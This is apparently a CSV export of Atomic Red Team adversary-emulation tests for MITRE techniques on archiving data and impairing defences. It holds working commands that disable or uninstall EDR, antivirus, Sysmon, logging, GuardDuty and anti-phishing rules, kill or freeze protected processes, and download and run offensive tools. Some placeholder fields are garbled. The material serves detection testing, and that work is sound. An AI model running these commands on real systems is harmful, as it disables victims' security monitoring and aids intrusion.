"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","ESXi - Remove Syslog remote IP","powershell","# Extract line with IP address from the syslog configuration output
PathToAtomicsFolder\..\ExternalPayloads\ -ssh PathToAtomicsFolder\..\ExternalPayloads\ -l PathToAtomicsFolder\..\ExternalPayloads\ -pw PathToAtomicsFolder\..\ExternalPayloads\ -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r ""[0-9]*\.[0-9]*\.[0-9]*\."" > c:\temp\loghost.txt

# Replace the IP with ""0""
PathToAtomicsFolder\..\ExternalPayloads\ -ssh PathToAtomicsFolder\..\ExternalPayloads\ -l PathToAtomicsFolder\..\ExternalPayloads\ -pw PathToAtomicsFolder\..\ExternalPayloads\ -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt

# Extract the IP from the line extracted from findstr
$inputFilePath = ""c:\temp\loghost.txt""
$outputFilePath = ""c:\temp\loghost_ip.txt""

$fileContent = Get-Content -Path $inputFilePath -Raw

if ([string]::IsNullOrWhiteSpace($fileContent)) {
    Write-Host ""The content is $fileContent""
    Write-Host ""The file is empty""
} else {
    # Use a regular expression to extract IP addresses
    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value
    
    $output = ""esxcli system syslog config set --loghost="" + $ipAddresses

    $output | Out-File -FilePath $outputFilePath -Encoding ascii
    
    Write-Host ""IP addresses extracted and saved to $outputFilePath""
}
","# Re-add the initially extracted IP
PathToAtomicsFolder\..\ExternalPayloads\ -ssh PathToAtomicsFolder\..\ExternalPayloads\ -l PathToAtomicsFolder\..\ExternalPayloads\ -pw PathToAtomicsFolder\..\ExternalPayloads\ -m c:\temp\loghost_ip.txt

rm c:\temp\loghost_ip.txt
rm c:\temp\loghost.txt
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Compress a File for Exfiltration using Makecab","command_prompt","makecab.exe C:\Temp\sam.hiv C:\Temp\art.zip
","del C:\Temp\art.zip
","fsutil file createnew c:\Temp\sam.hiv 10485760 "
"T1560.001","C:\AtomicRedTeam\atomics\T1560.001\T1560.001.yaml","Copy and Compress AppData Folder","powershell","$AppData=""$env:USERPROFILE\AppData""
$Copy=""$env:USERPROFILE\Desktop\AppDataCopy""
$Zip=""$env:USERPROFILE\Desktop\AppDataBackup.zip""

if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force }
New-Item -ItemType Directory -Path $Copy | Out-Null

Get-ChildItem $AppData -Recurse -Force | ForEach-Object {
  $rel = $_.FullName.Substring($AppData.Length + 1)
  $dest = Join-Path $Copy $rel
  if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }
  else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue }
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
",,"Run PowerShell as Administrator and ensure .NET compression assemblies are available. "
"T1560.002","C:\AtomicRedTeam\atomics\T1560.002\T1560.002.yaml","Compressing data using GZip in Python (FreeBSD/Linux)","sh","which_python=`which python || which python3`
$which_python -c ""import gzip;input_file=open('please install python to run this test', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('please install python to run this test','wb',compresslevel=6);output_file.write(content);output_file.close();""
","rm please install python to run this test
","echo ""please install python to run this test""; exit 1 "
"T1560.002","C:\AtomicRedTeam\atomics\T1560.002\T1560.002.yaml","Compressing data using bz2 in Python (FreeBSD/Linux)","sh","which_python=`which python || which python3`
$which_python -c ""import bz2;input_file=open('please install python to run this test','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('please install python to run this test','w+');output_file.write(str(bz2content));output_file.close();""
","rm please install python to run this test
","echo ""please install python to run this test""; exit 1 "
"T1560.002","C:\AtomicRedTeam\atomics\T1560.002\T1560.002.yaml","Compressing data using zipfile in Python (FreeBSD/Linux)","sh","which_python=`which python || which python3`
$which_python -c ""from zipfile import ZipFile; ZipFile('please install python to run this test', mode='w').write('please install python to run this test')""
","rm please install python to run this test
","echo ""please install python to run this test""; exit 1 "
"T1560.002","C:\AtomicRedTeam\atomics\T1560.002\T1560.002.yaml","Compressing data using tarfile in Python (FreeBSD/Linux)","sh","which_python=`which python || which python3`
$which_python -c ""import tarfile; output_file = tarfile.open('please install python to run this test','w'); output_file.add('please install python to run this test'); output_file.close()"" 
","rm please install python to run this test
","echo ""please install python to run this test""; exit 1 "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Disable syslog","sh","systemctl stop rsyslog ; systemctl disable rsyslog
","systemctl start rsyslog ; systemctl enable rsyslog
","sudo #{package_installer}  "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Stop and unload Crowdstrike Falcon on macOS","sh","sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist
sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
","sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist
sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Unload Sysmon Filter Driver","command_prompt","fltmc.exe unload PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe
","sysmon -u -i > nul 2>&1
sysmon -i -accepteula -i > nul 2>&1
""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -u > nul 2>&1
""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i > nul 2>&1
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://download.sysinternals.com/files/Sysmon.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"" Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon"" -Force ; if(cmd.exe /c ""where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul"") { C:\Windows\Sysmon.exe -accepteula -i } else { & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i} ; if(Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe""){   & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -u   & ""PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"" -accepteula -i }else{   sysmon -u   sysmon -accepteula -i } "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Uninstall Sysmon","command_prompt","sysmon -u
","sysmon -i -accepteula >nul 2>&1
","$parentpath = Split-Path ""#{sysmon_exe}""; $zippath = ""$parentpath\Sysmon.zip"" New-Item -ItemType Directory $parentpath -Force | Out-Null Invoke-WebRequest ""https://download.sysinternals.com/files/Sysmon.zip"" -OutFile ""$zippath"" Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath if(-not ($Env:Path).contains($parentpath)){$Env:Path += "";$parentpath""} ; cmd /c sysmon -i -accepteula "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Disable Arbitrary Security Windows Service","command_prompt","net.exe stop McAfeeDLPAgentService
sc.exe config McAfeeDLPAgentService start= disabled
","sc.exe config McAfeeDLPAgentService start= auto >nul 2>&1
net.exe start McAfeeDLPAgentService >nul 2>&1
",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Stop and Remove Arbitrary Security Windows Service","powershell","Stop-Service -Name McAfeeDLPAgentService
Remove-Service -Name McAfeeDLPAgentService
",,""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Uninstall Crowdstrike Falcon on Windows","powershell","if (Test-Path ""C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe"") {. ""C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\ProgramData\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}",,""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Tamper with Windows Defender Evade Scanning -Folder","powershell","$excludedpath= ""C:\Temp""
Add-MpPreference -ExclusionPath $excludedpath","$excludedpath= ""C:\Temp""
Remove-MpPreference -ExclusionPath $excludedpath
",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Tamper with Windows Defender Evade Scanning -Extension","powershell","$excludedExts= "".exe""
Add-MpPreference -ExclusionExtension  $excludedExts","$excludedExts= "".exe""
Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore
",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Tamper with Windows Defender Evade Scanning -Process","powershell","$excludedProcess = ""outlook.exe""
Add-MpPreference -ExclusionProcess $excludedProcess","$excludedProcess = ""outlook.exe""
Remove-MpPreference -ExclusionProcess  $excludedProcess
",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","office-365-Disable-AntiPhishRule","powershell","$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
Connect-ExchangeOnline -Credential $creds
$test = Get-AntiPhishRule
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false
Get-AntiPhishRule
","if("""" -ne """") {
$secure_pwd = ("""" + """") | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
Connect-ExchangeOnline -Credential $creds
$test = Get-AntiPhishRule
Enable-AntiPhishRule -Identity $test.Name -Confirm:$false
Get-AntiPhishRule
} 
","Install-Module -Name ExchangeOnlineManagement Import-Module ExchangeOnlineManagement "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Disable Defender Using NirSoft AdvancedRun","powershell","Try {cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}
if(PathToAtomicsFolder\..\ExternalPayloads\){
  $CommandToRun = rmdir ""$env:programdata\Microsoft\Windows Defender"" -Recurse
  Try {cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\"" /EXEFilename ""$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""$CommandToRun"" /StartDirectory """" /RunAs 8 /Run} Catch{}
}
","Try {cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""start WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""http://www.nirsoft.net/utils/advancedrun.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"" Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -Force "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Kill antimalware protected processes using Backstab","powershell","& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n PathToAtomicsFolder\..\ExternalPayloads\
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","AWS - GuardDuty Suspension or Deletion","bash","detectorId=$(aws guardduty create-detector --enable --region ""Please install the aws-cli and configure your AWS default profile using: aws configure"" | grep -oP '(?<=""DetectorId"": "")[^""]*')
aws guardduty update-detector --no-enable --detector-id $detectorId
aws guardduty delete-detector --detector-id $detectorId
","echo ""If test successfully ran, no cleanup required.""
","echo ""Please install the aws-cli and configure your AWS default profile using: aws configure"" "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","ESXi - Disable Account Lockout Policy via PowerCLI","powershell","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server atomic.local -User root -Password pass
Get-AdvancedSetting -Entity atomic.local -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
Disconnect-VIServer -Confirm:$false
",,"Install-Module -Name VMware.PowerCLI -Confirm:$false "
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Disable EventLog-Application ETW Provider Via Registry - Cmd","command_prompt","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"" /v ""Enabled"" /t REG_DWORD /d ""1"" /f",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Disable EventLog-Application ETW Provider Via Registry - PowerShell","powershell","New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"" -Name Enabled -Value 0 -PropertyType ""DWord"" -Force","New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"" -Name Enabled -Value 1 -PropertyType ""DWord"" -Force",""
"T1562.001","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml","Freeze PPL-protected process with EDR-Freeze","powershell","# Enable SeDebugPrivilege
Add-Type -TypeDefinition @""
using System;
using System.Runtime.InteropServices;

public class TokenAdjuster {
    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;

    public static bool EnableSeDebugPrivilege() {
        IntPtr hToken;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            return false;

        long luid;
        if (!LookupPrivilegeValue(null, ""SeDebugPrivilege"", out luid))
            return false;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
""@

$result = [TokenAdjuster]::EnableSeDebugPrivilege()
if ($result) {
    Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green
} else {
    Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red
    exit 1
}

# Get basic process info
$process = Get-Process -Name $SecurityHealthService -ErrorAction Stop
$processName = $process.ProcessName
Write-Host ""Process Name: $processName)""
Write-Host ""PID: $($process.Id)""
        
# Get executable path and user info
$query = ""SELECT * FROM Win32_Process WHERE Name = '$processName.exe'""
$wmiProcess = Get-WmiObject -Query $query

$owner = $wmiProcess.GetOwner()
    Write-Host ""User: $($owner.Domain)\$($owner.User)""


# Get the folder of the current script
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition

# Download latest EDR-Freeze package and extract (force replace)
$downloadUrl = ""https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip""
$zipPath = Join-Path $scriptFolder ""EDR-Freeze_1.0.zip""
Write-Host ""Downloading latest EDR-Freeze from $downloadUrl"" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host ""Download completed: $zipPath"" -ForegroundColor Green
    $extractFolder = $scriptFolder
    if (Test-Path $zipPath) {
        Write-Host ""Extracting archive to $extractFolder (overwriting existing files)"" -ForegroundColor Cyan
        if (Test-Path $extractFolder) {
            # Ensure target exe not locked; attempt to stop any running instance silently
            Get-Process -Name ""EDR-Freeze_1.0"" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)
        $archive = $null
        try {
            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            foreach ($entry in $archive.Entries) {
                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }
                if ($entry.FullName.EndsWith('/')) { # directory entry
                    $dirPath = Join-Path $extractFolder $entry.FullName
                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }
                    continue
                }
                $destPath = Join-Path $extractFolder $entry.FullName
                $destDir = Split-Path $destPath -Parent
                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }
                try {
                    # Use static extension method (PowerShell 5.1 compatible)
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)
                } catch {
                    Write-Host ""Failed to extract entry $($entry.FullName): $_"" -ForegroundColor Yellow
                }
            }
            Write-Host ""Extraction completed."" -ForegroundColor Green
        } finally {
            if ($archive) { $archive.Dispose() }
        }
    }
} catch {
    Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red
}

# Wait 15s before putting targeted process before putting it in the comma
Write-Host ""Waiting 15s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""Waiting 5s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 3
Write-Host ""Waiting 2s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# Put targeted  process in the comma for 15s
# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)
$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 1 -ExpandProperty Name
if (-not $edrFreezeExeName) {
    Write-Host ""No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder"" -ForegroundColor Red
    exit 1
}

$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName
Write-Host ""Using EDR-Freeze executable: $edrFreezeExeName"" -ForegroundColor Cyan
Write-Host ""$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)"" -ForegroundColor Yellow
Start-Process -FilePath $edrFreezeExe -ArgumentList (""$($process.Id) 15000"") | Out-Null","Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
Write-Output ""File deleted: $edrFreezeExe""",""
